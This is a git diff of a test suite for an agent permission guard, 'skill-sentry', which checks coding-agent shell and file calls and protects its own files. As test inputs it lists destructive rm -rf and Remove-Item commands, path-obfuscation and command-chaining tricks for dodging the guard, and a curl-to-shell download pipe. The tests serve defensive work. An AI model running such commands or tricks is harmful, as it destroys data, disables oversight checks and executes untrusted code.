@@ -5,13 +5,13 @@ import os from 'node:os';
 import path from 'node:path';
 import { spawn, spawnSync } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
-import { extractTargets, decide, formatReason, scanSummary, originToComponentId, originMayNameSkillSentry, isUnusualPath } from '../scripts/lib/guardcore.mjs';
-import { findOrigin } from '../scripts/lib/origin.mjs';
-import { discover } from '../scripts/lib/inventory.mjs';
+import { extractTargets, decide, formatReason, scanSummary, originToComponentId, originMayNameSkillSentry, isUnusualPath } from '../skills/audit/scripts/lib/guardcore.mjs';
+import { findOrigin } from '../skills/audit/scripts/lib/origin.mjs';
+import { discover } from '../skills/audit/scripts/lib/inventory.mjs';
 import { tmpFactory, removeTree, copyTree } from './helpers/tmp.mjs';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
-const GUARD = path.resolve(HERE, '..', 'scripts', 'guard.mjs');
+const GUARD = path.resolve(HERE, '..', 'skills', 'audit', 'scripts', 'guard.mjs');
 const T = name => path.join(HERE, 'fixtures', 'transcripts', name);
 const tmp = tmpFactory('ss-guard-');
 
@@ -173,7 +173,7 @@ test('self-protection is not fooled by .., mixed slashes or case', () => {
     `${DATA}/../${base}/allowlist.json`,
     DATA.replace(/\\/g, '/') + '\\baseline.json',
     `${DATA}${path.sep}sub${path.sep}..${path.sep}baseline.json`,
-    path.join(SELF, 'scripts', 'lib', 'rules.mjs'),
+    path.join(SELF, 'skills', 'audit', 'scripts', 'lib', 'rules.mjs'),
     `${SELF}/scripts/../hooks/hooks.json`,
   ];
   if (process.platform === 'win32') variants.push(DATA.toUpperCase() + '\\allowlist.json');
@@ -192,7 +192,7 @@ test('shell commands touching skill-sentry dirs always ask', () => {
     ['PowerShell', `Set-Content -Path "${winData}\\allowlist.json" -Value x`],
     ['PowerShell', 'Set-Content -Path "$env:USERPROFILE\\.claude\\skill-sentry\\allowlist.json" -Value x'],
     ['PowerShell', 'Copy-Item a.json %USERPROFILE%\\.claude\\skill-sentry\\'],
-    ['Bash', `rm -r ${SELF}${path.sep}scripts`],
+    ['Bash', `rm -r ${SELF}${path.sep}skills`],
   ];
   if (process.platform === 'win32') cases.push(['PowerShell', `Set-Content ${winData.toUpperCase()}\\ALLOWLIST.JSON x`]);
   for (const [tool, command] of cases) {
@@ -209,9 +209,10 @@ test('shell commands touching skill-sentry dirs always ask', () => {
 test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pass SELF_PROTECT', () => {
   // Long (realpath) form: an 8.3 temp dir would make the script path an unusual form (Ruling K).
   const S = fs.realpathSync.native(SELF);
-  const scan = path.join(S, 'scripts', 'scan.mjs');
-  const viaSkill = path.join(S, 'skills', 'audit', '..', '..', 'scripts', 'scan.mjs');
-  const harden = path.join(S, 'skills', 'harden', '..', '..', 'scripts', 'harden.mjs');
+  const scan = path.join(S, 'skills', 'audit', 'scripts', 'scan.mjs');
+  // Literal `..` (path.join would collapse it): the spelling the harden SKILL.md produces for the shared scripts.
+  const viaSkill = [S, 'skills', 'harden', '..', 'audit', 'scripts', 'scan.mjs'].join(path.sep);
+  const harden = path.join(S, 'skills', 'harden', '..', 'audit', 'scripts', 'harden.mjs');
   const fwd = s => s.replace(/\\/g, '/');
   // Ruling L3: under Bash every `\` disqualifies (it escapes and merges words), so Bash forms use
   // forward slashes; under PowerShell a `\` is accepted inside the quoted script path only.
@@ -247,8 +248,9 @@ test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pa
     `node "${viaSkill}" --path \`echo x\``,
     `node "${viaSkill}" --json\nrm -r x`,
     `node "${viaSkill}" --component 'a'"b"`,
-    `node "${path.join(SELF, 'scripts', 'guard.mjs')}"`,
-    `node "${path.join(SELF, 'scripts', 'lib', 'scan.mjs')}" --json`,
+    `node "${path.join(SELF, 'skills', 'audit', 'scripts', 'guard.mjs')}"`,
+    `node "${path.join(SELF, 'skills', 'audit', 'scripts', 'lib', 'scan.mjs')}" --json`,
+    `node "${path.join(SELF, 'skills', 'audit', 'scan.mjs')}" --json`,
     `node "${viaSkill}x" --json`,
     `bun "${viaSkill}" --json`,
     `node --require x "${viaSkill}" --json`,
@@ -264,7 +266,7 @@ test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pa
 
 test('Ruling L3: read-only self invocation is a positive ASCII allow-list (word-merge and re-split bypasses ask)', () => {
   const S = fs.realpathSync.native(SELF);
-  const scanWin = path.join(S, 'scripts', 'scan.mjs');
+  const scanWin = path.join(S, 'skills', 'audit', 'scripts', 'scan.mjs');
   const scanFwd = scanWin.replace(/\\/g, '/');
   const UB = '--update-baseline';
   const asks = {
@@ -309,10 +311,10 @@ test('Ruling L3: read-only self invocation is a positive ASCII allow-list (word-
 
 test('Ruling M: only fixed token lists bypass SELF_PROTECT (PowerShell array/comma and empty-arg forms ask)', () => {
   const S = fs.realpathSync.native(SELF);
-  const scanWin = path.join(S, 'scripts', 'scan.mjs');
+  const scanWin = path.join(S, 'skills', 'audit', 'scripts', 'scan.mjs');
   const scanFwd = scanWin.replace(/\\/g, '/');
-  const viaSkillWin = path.join(S, 'skills', 'audit', '..', '..', 'scripts', 'scan.mjs');
-  const hardenWin = path.join(S, 'scripts', 'harden.mjs');
+  const viaSkillWin = [S, 'skills', 'harden', '..', 'audit', 'scripts', 'scan.mjs'].join(path.sep);
+  const hardenWin = path.join(S, 'skills', 'audit', 'scripts', 'harden.mjs');
   const UB = '--update-baseline';
   const asks = {
     PowerShell: [
@@ -358,6 +360,230 @@ test('Ruling M: only fixed token lists bypass SELF_PROTECT (PowerShell array/com
     `node "${hardenWin}" check`,
     `NODE.EXE ${scanWin} --diff-only --json`,
   ]) assert.equal(d('PowerShell', { command }).decision, 'none', `PowerShell: ${command}`);
+});
+
+test('Ruling M self invocations at the new path pass, the old path asks', async () => {
+  // The repo itself is the plugin root here, so the spawned guard derives the same self root.
+  const ROOT = fs.realpathSync.native(path.resolve(HERE, '..'));
+  const fwd = s => s.replace(/\\/g, '/');
+  const forms = dir => {
+    const scan = path.join(ROOT, ...dir, 'scan.mjs');
+    const harden = path.join(ROOT, ...dir, 'harden.mjs');
+    return { Bash: [`node "${fwd(scan)}" --json`, `node "${fwd(harden)}" check`], PowerShell: [`node "${scan}" --json`, `node "${harden}" check`] };
+  };
+  const now = forms(['skills', 'audit', 'scripts']);
+  const old = forms(['scripts']);
+  // In process: Claude Code's decision and Codex's (skill views on, no shell cwd), Bash and PowerShell.
+  for (const [agent, extra] of [['claude', {}], ['codex', { selfViews: true, shellCwd: false }]]) {
+    const dd = (toolName, command) => decide({ toolName, toolInput: { command }, origin: null, allowlist: EMPTY, selfRoot: ROOT, dataDir: DATA, ...extra });
+    for (const tool of ['Bash', 'PowerShell']) {
+      for (const command of now[tool]) assert.equal(dd(tool, command).decision, 'none', `${agent} ${tool}: ${command}`);
+      for (const command of old[tool]) {
+        const r = dd(tool, command);
+        assert.equal(r.decision, 'ask', `${agent} ${tool}: ${command}`);
+        assert.equal(r.ruleId, 'SELF_PROTECT', `${agent} ${tool}: ${command}`);
+      }
+    }
+  }
+  // The guard itself, from its new location: Claude Code (ask) and Codex (an ask becomes a run-it-yourself deny).
+  const guard = path.join(ROOT, 'skills', 'audit', 'scripts', 'guard.mjs');
+  const claudeIn = command => JSON.stringify({ session_id: 'c1', prompt_id: 'p1', transcript_path: null, cwd: tmp('mcwd'), hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } });
+  const codexIn = command => JSON.stringify({
+    session_id: '0193a000-0000-7000-8000-00000000000c', transcript_path: null, cwd: tmp('mcwd'), hook_event_name: 'PreToolUse', model: 'gpt-5',
+    permission_mode: 'default', turn_id: 'turn-1', tool_name: 'Bash', tool_use_id: 'call-1', tool_input: { command },
+  });
+  for (const [agent, input] of [['claude', claudeIn], ['codex', codexIn]]) {
+    for (const command of now.Bash) {
+      const r = await runGuard(input(command), {}, guard);
+      assert.equal(r.code, 0, `${agent}: ${command}`);
+      assert.equal(r.stderr, '', `${agent}: ${command}`);
+      assert.equal(r.stdout, '', `${agent}: ${command}`);
+      assert.ok(!fs.existsSync(path.join(r.data, 'guard.log')), `${agent}: nothing logged for ${command}`);
+    }
+    for (const command of old.Bash) {
+      const r = await runGuard(input(command), {}, guard);
+      const h = JSON.parse(r.stdout).hookSpecificOutput;
+      if (agent === 'claude') assert.equal(h.permissionDecision, 'ask', command);
+      else {
+        assert.equal(h.permissionDecision, 'deny', command);
+        assert.match(h.permissionDecisionReason, /run this command themselves in a terminal/, command);
+      }
+    }
+  }
+});
+
+test('Ruling M in a standalone skill install: <skill dir>/scripts/{scan,harden}.mjs pass, every other form asks', async () => {
+  // A standalone install (npx skills add) has no plugin root: the skill dir is the self root.
+  const SA = path.join(tmp('sa'), 'skill-sentry-audit');
+  copyTree(path.join(HERE, '..', 'skills', 'audit'), SA);
+  const fwd = s => s.replace(/\\/g, '/');
+  const scan = path.join(SA, 'scripts', 'scan.mjs');
+  const harden = path.join(SA, 'scripts', 'harden.mjs');
+  const none = {
+    Bash: [`node "${fwd(scan)}" --json`, `node ${fwd(scan)} --json --diff-only`, `node '${fwd(harden)}' check`],
+    PowerShell: [`node "${scan}" --json`, `node "${harden}" check`],
+  };
+  const asks = {
+    Bash: [
+      `node "${fwd(scan)}" --update-baseline`, `node "${fwd(scan)}" --json --path x`, `node "${fwd(harden)}"`,
+      `node "${fwd(path.join(SA, 'scripts', 'guard.mjs'))}"`, `node "${fwd(path.join(SA, 'scripts', 'lib', 'rules.mjs'))}"`,
+      `node "${fwd(path.join(SA, 'skills', 'audit', 'scripts', 'scan.mjs'))}" --json`, `rm -rf "${fwd(SA)}"`,
+    ],
+    PowerShell: [`node "${scan}" --update-baseline`, `Remove-Item -Recurse "${SA}"`],
+  };
+  for (const [agent, extra] of [['claude', {}], ['codex', { selfViews: true, shellCwd: false }]]) {
+    const dd = (toolName, command) => decide({ toolName, toolInput: { command }, origin: null, allowlist: EMPTY, selfRoot: SA, selfSkill: SA, dataDir: DATA, ...extra });
+    for (const tool of ['Bash', 'PowerShell']) {
+      for (const command of none[tool]) assert.equal(dd(tool, command).decision, 'none', `${agent} ${tool}: ${command}`);
+      for (const command of asks[tool]) assert.equal(dd(tool, command).ruleId, 'SELF_PROTECT', `${agent} ${tool}: ${command}`);
+    }
+  }
+  // The plugin layout keeps asking for <root>/scripts/scan.mjs (the old path) even with the skill dir passed.
+  const P = fs.realpathSync.native(path.resolve(HERE, '..'));
+  const old = `node "${fwd(path.join(P, 'scripts', 'scan.mjs'))}" --json`;
+  assert.equal(decide({ toolName: 'Bash', toolInput: { command: old }, origin: null, allowlist: EMPTY, selfRoot: P, selfSkill: path.join(P, 'skills', 'audit'), dataDir: DATA }).decision, 'ask');
+  // The guard spawned from the standalone copy derives the same roots.
+  const guard = path.join(SA, 'scripts', 'guard.mjs');
+  const input = command => JSON.stringify({ session_id: 'c1', prompt_id: 'p1', transcript_path: null, cwd: tmp('mcwd'), hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } });
+  for (const command of none.Bash) {
+    const r = await runGuard(input(command), {}, guard);
+    assert.equal(`${r.code}|${r.stderr}|${r.stdout}`, '0||', command);
+  }
+  const r = await runGuard(input(asks.Bash[0]), {}, guard);
+  assert.equal(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision, 'ask');
+});
+
+test('plugin guard + standalone skill-sentry install: only the fixed scan invocation (and, Codex only, the SKILL.md read) of a verified standalone dir pass', () => {
+  // npx skills add puts the audit at ~/.agents/skills/<name> (+ a link in ~/.claude/skills); <name> contains skill-sentry.
+  const H = os.homedir();
+  const proj = tmp('saproj');
+  const fwd = s => s.replace(/\\/g, '/');
+  const dirs = [
+    path.join(H, '.agents', 'skills', 'skill-sentry-audit'),
+    path.join(H, '.claude', 'skills', 'skill-sentry-audit'),
+    path.join(H, '.codex', 'skills', 'skill-sentry'),
+    path.join(proj, '.agents', 'skills', 'skill-sentry-audit'),
+  ];
+  for (const [agent, extra] of [['claude', {}], ['codex', { selfViews: true, shellCwd: false }]]) {
+    // `verifySkill` stands in for the guard's content check (matchSelf 'skill', selfverify.mjs): it vouches here.
+    const asked = [];
+    const verifySkill = d => { asked.push(d); return true; };
+    const dd = (toolName, command, v = verifySkill) => decide({ toolName, toolInput: { command }, origin: null, allowlist: EMPTY, selfRoot: SELF, dataDir: DATA, verifySkill: v, ...extra });
+    for (const dir of dirs) {
+      const scan = path.join(dir, 'scripts', 'scan.mjs');
+      const skillMd = path.join(dir, 'SKILL.md');
+      const none = {
+        Bash: [`node "${fwd(scan)}" --json`, `node ${fwd(scan)} --json --diff-only`, `node '${fwd(scan)}'`,
+          ...(agent === 'codex' ? [`node "${fwd(scan)}" --json --agent codex`, `cat "${fwd(skillMd)}"`, `sed -n '1,200p' ${fwd(skillMd)}`] : [])],
+        PowerShell: [`node "${scan}" --json`,
+          ...(agent === 'codex' ? [`Get-Content -LiteralPath "${skillMd}" -Raw`, `type "${skillMd}"`] : [])],
+      };
+      const asks = {
+        Bash: [
+          `node "${fwd(scan)}" --update-baseline`, `node "${fwd(scan)}" --json --path x`, `node "${fwd(scan)}" --json > out.txt`,
+          `node "${fwd(scan)}" --json; rm -rf x`, `node "${fwd(scan)}" --json && rm -rf x`, `node "${fwd(scan)}" --json | tee x`,
+          `node "${fwd(path.join(dir, 'scripts', 'harden.mjs'))}" check`, `node "${fwd(path.join(dir, 'scripts', 'guard.mjs'))}"`,
+          `node "${fwd(path.join(dir, 'scripts', 'lib', 'rules.mjs'))}"`, `node "${fwd(path.join(dir, 'x', 'scripts', 'scan.mjs'))}" --json`,
+          `node "${fwd(dir)}/scripts/../scripts/scan.mjs" --json`, `node "${fwd(dir)}/./scripts/scan.mjs" --json`,
+          `node ~/${fwd(path.relative(H, scan))} --json`, `node "${fwd(scan)}" --agent codex --agent claude`,
+          `cat "${fwd(skillMd)}" > out.txt`, `cat "${fwd(skillMd)}"; rm -rf x`, `cat "${fwd(skillMd)}" "${fwd(scan)}"`,
+          `cat "${fwd(scan)}"`, `cat "${fwd(path.join(dir, 'x', 'SKILL.md'))}"`, `cat "${fwd(skillMd)}.bak"`, `sed -i 's/a/b/' "${fwd(skillMd)}"`,
+          `rm -rf "${fwd(dir)}"`,
+          ...(agent === 'claude' ? [`cat "${fwd(skillMd)}"`, `node "${fwd(scan)}" --json --agent codex`] : []),
+        ],
+        PowerShell: [`node "${scan}" --update-baseline`, `node "${scan}" --json > out.txt`, `Remove-Item -Recurse "${dir}"`,
+          `Get-Content -LiteralPath "${skillMd}" "${scan}"`, ...(agent === 'claude' ? [`Get-Content -Raw "${skillMd}"`] : [])],
+      };
+      for (const tool of ['Bash', 'PowerShell']) {
+        for (const command of none[tool]) {
+          asked.length = 0;
+          assert.equal(dd(tool, command).decision, 'none', `${agent} ${tool}: ${command}`);
+          assert.deepEqual(asked, [path.resolve(dir)], `${agent} ${tool}: the copy checked is the skill dir: ${command}`);
+          // Final review I1: without a verifier, or when the copy is not verified, the same form asks.
+          assert.equal(dd(tool, command, null).ruleId, 'SELF_PROTECT', `${agent} ${tool} unverified: ${command}`);
+          assert.equal(dd(tool, command, () => false).ruleId, 'SELF_PROTECT', `${agent} ${tool} not a copy: ${command}`);
+        }
+        for (const command of asks[tool]) assert.equal(dd(tool, command).ruleId, 'SELF_PROTECT', `${agent} ${tool}: ${command}`);
+      }
+    }
+    // The shape is anchored: a skill-sentry dir that is not directly in a skills dir, or a standalone-looking path
+    // inside the data dir or the running plugin root, gets no exemption.
+    for (const dir of [path.join(DATA, '.agents', 'skills', 'skill-sentry-audit'), path.join(SELF, '.claude', 'skills', 'skill-sentry-audit')]) {
+      for (const command of [`node "${fwd(path.join(dir, 'scripts', 'scan.mjs'))}" --json`, ...(agent === 'codex' ? [`cat "${fwd(path.join(dir, 'SKILL.md'))}"`] : [])]) {
+        assert.equal(dd('Bash', command).ruleId, 'SELF_PROTECT', `${agent}: ${command}`);
+      }
+    }
+  }
+});
+
+test('final review I2: a skill-sentry-audit segment (the standalone install name) goes through Ruling J / R9 / P3 like skill-sentry', () => {
+  const fwd2 = s => s.replace(/\\/g, '/');
+  const H = fwd2(os.homedir());
+  // A link to a skills dir: the segment is resolved through it.
+  const base = tmp('i2');
+  const skills = path.join(base, 'home', '.agents', 'skills');
+  fs.mkdirSync(path.join(skills, 'skill-sentry-audit'), { recursive: true });
+  const link = path.join(base, 'lnk');
+  fs.symlinkSync(skills, link, process.platform === 'win32' ? 'junction' : 'dir');
+  for (const [tool, command] of [
+    ['Bash', 'cd ~/.agents/skills && rm -rf skill-sentry-audit'],
+    ['Bash', 'pushd ~/.agents/skills; rm -rf skill-sentry-audit'],
+    ['Bash', 'cd ~/.agents && rm -rf skills/skill-sentry-audit'],
+    ['Bash', 'D=skill-sentry-audit; rm -rf ~/.agents/skills/$D'],
+    ['Bash', `rm -rf ${H}/.agents/skills/skill\\-sentry-audit`],
+    ['Bash', `cd ${H}/.claude/skills && rm -rf skill-sentry-audit`],
+    ['Bash', `rm -rf "${fwd2(link)}/skill-sentry-audit"`],
+    ['PowerShell', 'Set-Location ~\\.agents\\skills; Remove-Item -Recurse skill-sentry-audit'],
+    ['PowerShell', 'Remove-Item -Recurse (Join-Path ~/.agents/skills skill-sentry-audit)'],
+  ]) {
+    assert.equal(d(tool, { command }).ruleId, 'SELF_PROTECT', `${tool}: ${command}`);
+  }
+  // A literal absolute path away from the agent homes and protected roots stays exempt (R9), as for skill-sentry.
+  const far = fwd2(path.join(tmp('i2far'), 'skill-sentry-audit', 'README.md'));
+  assert.equal(d('Bash', { command: `cat ${far}` }).decision, 'none', far);
+});
+
+test('SELF_PROTECT covers standalone skill-sentry installs (~/.claude/skills, ~/.agents/skills, project dirs); other skills stay none', () => {
+  const H = os.homedir();
+  const proj = tmp('proj');
+  const dirs = [
+    path.join(H, '.claude', 'skills', 'skill-sentry'),
+    path.join(H, '.claude', 'skills', 'skill-sentry-audit'),
+    path.join(H, '.agents', 'skills', 'skill-sentry'),
+    path.join(H, '.agents', 'skills', 'my-skill-sentry-copy'),
+    path.join(proj, '.claude', 'skills', 'skill-sentry-audit'),
+    path.join(proj, '.agents', 'skills', 'skill-sentry'),
+    path.join(H, '.codex', 'skills', 'skill-sentry'), // Codex also loads skills from <codex home>/skills
+  ];
+  const fwd = s => s.replace(/\\/g, '/');
+  for (const dir of dirs) {
+    const file = path.join(dir, 'scripts', 'scan.mjs');
+    for (const [tool, input] of [['Write', { file_path: file, content: 'x' }], ['Edit', { file_path: path.join(dir, 'SKILL.md'), old_string: 'a', new_string: 'b' }]]) {
+      const r = d(tool, input);
+      assert.equal(r.decision, 'ask', `${tool} ${file}`);
+      assert.equal(r.ruleId, 'SELF_PROTECT_WRITE', `${tool} ${file}`);
+    }
+    for (const [tool, command] of [
+      ['Bash', `rm -rf "${fwd(dir)}"`],
+      ['Bash', `echo x > "${fwd(file)}"`],
+      ['PowerShell', `Remove-Item -Recurse -Force "${dir}"`],
+    ]) {
+      const r = d(tool, { command });
+      assert.equal(r.decision, 'ask', `${tool}: ${command}`);
+      assert.equal(r.ruleId, 'SELF_PROTECT', `${tool}: ${command}`);
+    }
+  }
+  for (const command of ['rm -rf ~/.claude/skills/skill-sentry-audit', 'rm -rf $HOME/.agents/skills/skill-sentry', 'rm -rf .claude/skills/skill-sentry-audit',
+    'cd /x && rm -rf ./.agents/skills/skill-sentry']) {
+    assert.equal(d('Bash', { command }).ruleId, 'SELF_PROTECT', command);
+  }
+  // Unrelated skill dirs, and skill-sentry names outside a skills dir, are untouched.
+  for (const dir of [path.join(H, '.claude', 'skills', 'other'), path.join(H, '.agents', 'skills', 'audit'), path.join(proj, '.claude', 'skills', 'sentry')]) {
+    assert.equal(d('Write', { file_path: path.join(dir, 'SKILL.md'), content: 'x' }).decision, 'none', dir);
+    assert.equal(d('Bash', { command: `rm -rf "${fwd(dir)}"` }).decision, 'none', dir);
+  }
+  assert.equal(d('Bash', { command: 'rm -rf ~/.claude/skills/other' }).decision, 'none');
+  assert.equal(d('Bash', { command: `ls ${fwd(path.join(proj, 'skills', 'skill-sentry-notes'))}` }).decision, 'none');
 });
 
 test('relative and non-canonical shell references to skill-sentry ask', () => {
@@ -1226,7 +1452,9 @@ test('formatReason with origin and scan summary', () => {
   assert.ok(s.includes('RCE_DOWNLOAD_PIPE_SHELL'));
   assert.ok(s.includes('likely source: plugin:evil@mkt'));
   assert.ok(s.includes('component verdict: suspicious (score 45), 3 findings'));
-  assert.ok(s.endsWith('Run /skill-sentry:audit for a full report.'));
+  // Agent-neutral (final review M7): Claude's /skill-sentry:audit is not a Codex command, nor the standalone skill's.
+  assert.ok(s.endsWith('Run the skill-sentry audit for a full report.'));
+  assert.ok(!s.includes('/skill-sentry:audit'));
   assert.ok(!s.includes('a'.repeat(201)));
 });
 test('formatReason without origin', () => {
@@ -1234,7 +1462,7 @@ test('formatReason without origin', () => {
   assert.ok(s.startsWith('skill-sentry: '));
   assert.ok(s.includes('no skill/plugin attributed'));
   assert.ok(s.includes('\\u200B'));
-  assert.ok(!s.includes('/skill-sentry:audit'));
+  assert.ok(!s.includes('skill-sentry audit'));
 });
 test('formatReason escapes quotes, C0 controls and ESC in the snippet and origin', () => {
   const s = formatReason({ decision: 'ask', ruleId: 'X', severity: 'high', snippet: 'a"b\x1b[31mc\nd\x07e\x7f' }, 'evil"\x1b]0;x\x07', null);
@@ -1328,7 +1556,7 @@ test('guard main: high with skill origin asks and runs the component check', asy
   assert.equal(out.permissionDecision, 'ask');
   assert.ok(out.permissionDecisionReason.includes('likely source: plugin:evil@mkt'), out.permissionDecisionReason);
   assert.ok(out.permissionDecisionReason.includes('component verdict: ok (score 0), 0 findings'), out.permissionDecisionReason);
-  assert.ok(out.permissionDecisionReason.endsWith('Run /skill-sentry:audit for a full report.'));
+  assert.ok(out.permissionDecisionReason.endsWith('Run the skill-sentry audit for a full report.'));
   assert.equal(logLines(r.data)[0].origin, 'plugin:evil@mkt');
 });
 test('guard main: write content is never logged, long commands are truncated', async () => {
@@ -1428,7 +1656,7 @@ test('guard main (L1): ask whose attributed plugin holds 20k directories answers
 
 /** In-process guard run with stub stdout/log that record the call order. */
 async function handleWith(input, { deadline = Date.now() + 1500, env = {} } = {}) {
-  const { handle } = await import('../scripts/lib/guardmain.mjs');
+  const { handle } = await import('../skills/audit/scripts/lib/guardmain.mjs');
   const events = [];
   let written = '';
   const keys = ['SKILL_SENTRY_DATA_DIR', 'SKILL_SENTRY_CLAUDE_HOME', 'SKILL_SENTRY_HOME_DIR'];
@@ -1469,11 +1697,12 @@ test('guard (L1): deny skips the component check; an expired budget skips it for
   assert.ok(ask.out.permissionDecisionReason.includes('component check skipped (time budget)'), ask.out.permissionDecisionReason);
 });
 
-test('originMayNameSkillSentry (R23): only an origin that can map onto a plugin named skill-sentry', () => {
-  for (const o of [{ skill: 'skill-sentry:audit' }, { mcpPlugin: 'skill-sentry' }, { mcpPlugin: 'other', mcpQualified: 'skill-sentry_srv' }]) {
+test('originMayNameSkillSentry (R23): only an origin that can map onto a plugin or standalone skill named skill-sentry', () => {
+  for (const o of [{ skill: 'skill-sentry:audit' }, { mcpPlugin: 'skill-sentry' }, { mcpPlugin: 'other', mcpQualified: 'skill-sentry_srv' },
+    { skill: 'skill-sentry' }, { skill: 'skill-sentry-audit' }, { skill: 'skill-sentry:skill-sentry-audit' }]) {
     assert.equal(originMayNameSkillSentry(o), true, JSON.stringify(o));
   }
-  for (const o of [null, {}, { skill: 'evil:helper' }, { skill: 'skill-sentry' }, { skill: 'skill-sentry-x:y' },
+  for (const o of [null, {}, { skill: 'evil:helper' }, { skill: 'audit' }, { skill: 'skill-sentry-x:y' },
     { mcpPlugin: 'evil', mcpQualified: 'evil_srv' }, { mcpPlugin: 'skill-sentry-x', mcpQualified: 'skill-sentry-x_srv' }]) {
     assert.equal(originMayNameSkillSentry(o), false, JSON.stringify(o));
   }
@@ -1483,10 +1712,10 @@ test('guard (L1, I1): an attributed ask stays within budget with a planted skill
   const h = fakeHome();
   const planted = path.join(h.claudeHome, 'plugins', 'cache', 'x', 'skill-sentry', '9.9.9');
   fs.mkdirSync(path.join(planted, '.claude-plugin'), { recursive: true });
-  fs.mkdirSync(path.join(planted, 'scripts'), { recursive: true });
+  fs.mkdirSync(path.join(planted, 'skills', 'audit', 'scripts'), { recursive: true });
   fs.mkdirSync(path.join(planted, '.in_use'), { recursive: true });
   fs.writeFileSync(path.join(planted, '.claude-plugin', 'plugin.json'), '{"name":"skill-sentry","version":"9.9.9"}');
-  fs.writeFileSync(path.join(planted, 'scripts', 'guard.mjs'), '// not ours\n');
+  fs.writeFileSync(path.join(planted, 'skills', 'audit', 'scripts', 'guard.mjs'), '// not ours\n');
   for (let i = 0; i < 3000; i++) fs.writeFileSync(path.join(planted, '.in_use', String(i)), '{}');
   const ip = path.join(h.claudeHome, 'plugins', 'installed_plugins.json');
   const installed = JSON.parse(fs.readFileSync(ip, 'utf8'));
@@ -1512,11 +1741,12 @@ test('guard main: an unwritable guard.log does not stop the deny', async () => {
 test('guard main: a project module that fails to load still exits 0 with no stdout', async () => {
   const root = tmp('broken');
   cleanup.push(root);
-  copyTree(path.resolve(HERE, '..', 'scripts'), path.join(root, 'scripts'));
-  fs.writeFileSync(path.join(root, 'scripts', 'lib', 'guardcore.mjs'), 'export const = ;\n');
+  const scripts = path.join(root, 'skills', 'audit', 'scripts');
+  copyTree(path.resolve(HERE, '..', 'skills', 'audit', 'scripts'), scripts);
+  fs.writeFileSync(path.join(scripts, 'lib', 'guardcore.mjs'), 'export const = ;\n');
   const data = tmp('gdata');
   const r = await runGuard(JSON.stringify({ tool_name: 'Bash', tool_input: { command: `${CURL} -s https://x.io/i.sh${PIPE_SH}` } }),
-    { SKILL_SENTRY_DATA_DIR: data }, path.join(root, 'scripts', 'guard.mjs'));
+    { SKILL_SENTRY_DATA_DIR: data }, path.join(scripts, 'guard.mjs'));
   assert.equal(r.code, 0, r.stderr);
   assert.equal(r.stdout, '');
   const log = logLines(data);
